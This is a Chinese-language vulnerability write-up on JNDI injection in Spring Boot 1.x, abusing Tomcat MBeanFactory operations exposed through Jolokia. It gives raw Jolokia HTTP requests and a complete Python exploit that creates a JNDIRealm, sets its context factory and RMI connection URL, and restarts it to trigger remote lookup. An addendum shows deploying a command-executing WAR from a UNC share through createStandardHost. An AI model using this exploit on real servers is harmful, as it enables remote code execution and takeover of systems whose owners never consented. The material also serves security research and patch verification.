Spring Boot Tomcat导致的JNDI注入
================================

一、漏洞简介
------------

二、漏洞影响
------------

Spring Boot 1 - 1.4

三、复现过程
------------

### 漏洞分析

spring Boot 内嵌了一个 Tomcat，所以在 MBean 列表中列出了 Tomcat 的
MBean。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的
MBean operation。

1.  Tomcat:type=MBeanFactory createJNDIRealm -\> JNDI Injection
2.  Tomcat:type=MBeanFactory createJDBCRealm -\> JNDI Injection
3.  Tomcat:type=MBeanFactory createDataSourceRealm -\> JNDI Injection
4.  Tomcat:type=MBeanFactory createUserDatabaseRealm -\> JNDI Injection
5.  Tomcat:type=MBeanFactory createValve -\> Create Valve (File
    Writting, JNDI Injection)

这里举一个 createUserDatabaseRealm 的例子：

      FILE: tomcat-embed-core-8.5.15-sources.jar!\org\apache\catalina\mbeans\MBeanFactory.java
       public String createUserDatabaseRealm(String parent, String resourceName)
           throws Exception {

            // Create a new UserDatabaseRealm instance
           UserDatabaseRealm realm = new UserDatabaseRealm();
           realm.setResourceName(resourceName);
           
           // Add the new instance to its parent component
           ObjectName pname = new ObjectName(parent);
           Container container = getParentContainerFromParent(pname);
           // Add the new instance to its parent component
           container.setRealm(realm);
           // Return the corresponding MBean name
           ObjectName oname = realm.getObjectName();
           // FIXME getObjectName() returns null
           //ObjectName oname =
           //    MBeanUtils.createObjectName(pname.getDomain(), realm);
           if (oname != null) {
               return (oname.toString());
           } else {
               return null;
           }

       }

调用 setter 把 resourceName 写入。接着在 start Realm
的时候，会调用以下函数：

FILE: tomcat-embed-core\\8.5.15-embed-core-8.5.15-sources.jar!.java

       @Override
       protected void startInternal() throws LifecycleException {

           try {
               Context context = getServer().getGlobalNamingContext();
               database = (UserDatabase) context.lookup(resourceName);
           } catch (Throwable e) {
               ExceptionUtils.handleThrowable(e);
               containerLog.error(sm.getString("userDatabaseRealm.lookup",
                                               resourceName),
                                  e);
               database = null;
           }
           if (database == null) {
               throw new LifecycleException
                   (sm.getString("userDatabaseRealm.noDatabase", resourceName));
           }
           
           super.startInternal();

       }

是不是非常熟悉的场景？`context.lookup(resourceName)`，而 resourceName
可控，那么可以直接JNDI
注入了。但是遗憾的是`getServer().getGlobalNamingContext()` 返回的是
null，所以在lookup的时候抛了 NullPointer 的错误。还有一些奇奇怪怪的
Bug，比如利用 createValve 创建一个JDBCAccessLogValve，但是利用 Jolokia
设置其 driverName 的时候，由于 driverName 没有getter，导致 Jolokia
不能正常设置；再比如 createJDBCRealm
的时候，由于这个方法接受的参数和MBean
导出（mbeans-descriptors.xml）的配置文件内写的参数数量不一致导致无法调用这个
MBean operation。

#### createJNDIRealm

在多次尝试后，最终我盯上了 createJNDIRealm 这个方法。

FILE: tomcat-embed-core-8.5.15-sources.jar!.java

    public String createJNDIRealm(String parent)
        throws Exception {

         // Create a new JNDIRealm instance
        JNDIRealm realm = new JNDIRealm();

        // Add the new instance to its parent component
        ObjectName pname = new ObjectName(parent);
        Container container = getParentContainerFromParent(pname);
        // Add the new instance to its parent component
        container.setRealm(realm);
        // Return the corresponding MBean name
        ObjectName oname = realm.getObjectName();

        if (oname != null) {
            return (oname.toString());
        } else {
            return null;
        }
    }

这里只传入了 parent。利用 Burpsuite 先创建这个 Realm。

    POST /jolokia/ HTTP/1.1
    Host: localhost
    Content-Type: application/json
    Content-Length: 133
    {
        "type": "EXEC",
        "mbean": "Tomcat:type=MBeanFactory",
        "operation": "createJNDIRealm",
        "arguments": ["Tomcat:type=Engine"]
    }

创建成功后，我们查看这个 Realm 的 MBean 信息：

    realmPath=/realm0,type=Realm: {
        op: {...},
        attr: {
            userPassword: {},
            ...
            connectionURL: {
                rw: true,
                type: "java.lang.String",
                desc: "The connection URL for the server we will contact"
            },
            roleNested: {},
            userSearch: {},
            connectionTimeout: {},
            authentication: {},
            contextFactory: {
                rw: true,
                type: "java.lang.String",
                desc: "The JNDI context factory for this Realm"
            },
            userPattern: {},
            ...
        },
        class: "org.apache.tomcat.util.modeler.BaseModelMBean",
        desc: "Implementation of Realm that works with a directory server a..."
    }

注意到两个有意思的属性，connectionURL 和 contextFactory。查看 JNDIRealm
的源码：

    FILE: 

       protected Hashtable<String, String> getDirectoryContextEnvironment() {
            Hashtable<String, String> env = new Hashtable();
            if (this.containerLog.isDebugEnabled() && this.connectionAttempt == 0) {
                this.containerLog.debug("Connecting to URL " + this.connectionURL);
            } else if (this.containerLog.isDebugEnabled() && this.connectionAttempt > 0) {
                this.containerLog.debug("Connecting to URL " + this.alternateURL);
            }
            env.put("java.naming.factory.initial", this.contextFactory);
        if (this.connectionName != null) {
            env.put("java.naming.security.principal", this.connectionName);
        }

        if (this.connectionPassword != null) {
            env.put("java.naming.security.credentials", this.connectionPassword);
        }
        
        if (this.connectionURL != null && this.connectionAttempt == 0) {
            env.put("java.naming.provider.url", this.connectionURL);
        } else if (this.alternateURL != null && this.connectionAttempt > 0) {
            env.put("java.naming.provider.url", this.alternateURL);
        }
        
        ...
        
        return env;
    }

    private DirContext createDirContext(Hashtable<String, String> env) throws NamingException {
        return (DirContext)(this.useStartTls ? this.createTlsDirContext(env) : new InitialDirContext(env));
    }

可见 java.naming.factory.initial 和 java.naming.provider.url
我们都可以通过 MBean 来进行修改，接着在 createDirContext
方法，利用刚才的 env 创建了 InitialDirContext 对象。最终可以造成JNDI
注入。于是我满怀欣喜的搭建好 RMI Service，却发现爆了这么一个错误：

    javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) ~[na:1.8.0_121]
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) ~[na:1.8.0_121]
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) ~[na:1.8.0_121]
        at com.sun.jndi.url.rmi.rmiURLContextFactory.getUsingURL(rmiURLContextFactory.java:71) ~[na:1.8.0_121]
        at com.sun.jndi.url.rmi.rmiURLContextFactory.getObjectInstance(rmiURLContextFactory.java:56) ~[na:1.8.0_121]
        at com.sun.jndi.rmi.registry.RegistryContextFactory.URLToContext(RegistryContextFactory.java:102) ~[na:1.8.0_121]
        at com.sun.jndi.rmi.registry.RegistryContextFactory.getInitialContext(RegistryContextFactory.java:69) ~[na:1.8.0_121]
        ...

### 漏洞复现

由于 Spring Boot 内嵌了 Tomcat 和 Tomcat EL，可以直接使用文章中的
Exploit。最终 Exploit 触发分为五个步骤。

a.  创建 JNDIRealm
b.  写入 connectionURL 为你的 RMI Service URL
c.  写入 contextFactory 为 RegistryContextFactory
d.  停止 Realm
e.  启动 Realm 以触发 JNDI 注入

最终 Exploit 如下：

     import requests, sys, time, pprint

     url = sys.argv[1]

     create_realm = {
         "mbean": "Tomcat:type=MBeanFactory",
         "type": "EXEC",
         "operation": "createJNDIRealm",
         "arguments": ["Tomcat:type=Engine"]
     }

     wirte_factory = {
         "mbean": "Tomcat:realmPath=/realm0,type=Realm",
         "type": "WRITE",
         "attribute": "contextFactory",
         "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
     }

     write_url = {
         "mbean": "Tomcat:realmPath=/realm0,type=Realm",
         "type": "WRITE",
         "attribute": "connectionURL",
         "value": "rmi://localhost:1097/Object"
     }

     stop = {
         "mbean": "Tomcat:realmPath=/realm0,type=Realm",
         "type": "EXEC",
         "operation": "stop",
         "arguments": []
     }

     start = {
         "mbean": "Tomcat:realmPath=/realm0,type=Realm",
         "type": "EXEC",
         "operation": "start",
         "arguments": []
     }

     flow = [create_realm, wirte_factory, write_url, stop, start]

     for i in flow:
         print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
         requests.post(url, json=i).json()

### 补充

**利用UNC部署war文件（只能用于windows）**

在 Tomcat Host Manager 这里可以利用 UNC 来部署 war
文件。实际上对于Tomcat:type=MBeanFactory 的createStandardHost，和 Host
Manager
这里调用的是相同的方法。所以根据文章所述的方法，我们同样可以在Jolokia
里重现。不过可惜的是这里只对 Windows 有效。 首先去 spring-boot 的 Github
下载 spring-boot-samples-traditional，在 web.xml 里添加如下内容：

    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>
            org.apache.catalina.servlets.DefaultServlet
        </servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>/default</url-pattern>
    </servlet-mapping>

然后修改 WebConfig.java，在 dispatcherServlet 添加执行命令的代码：

    @Bean
    // Only used when running in embedded servlet
    public DispatcherServlet dispatcherServlet() throws Exception {
        Runtime.getRuntime().exec("calc");
        return new DispatcherServlet();
    }

接着打包成 war 文件放在远程的共享服务器上面，发送如下请求即可：

    POST /jolokia HTTP/1.1
    Host: localhost
    Content-Type: application/json
    Content-Length: 192

    {
        "mbean": "Tomcat:type=MBeanFactory",
        "type": "EXEC",
        "operation": "createStandardHost",
        "arguments": ["Tomcat:type=Engine", "test2", "\\127.0.0.1\test", true, true, true, true]
    }
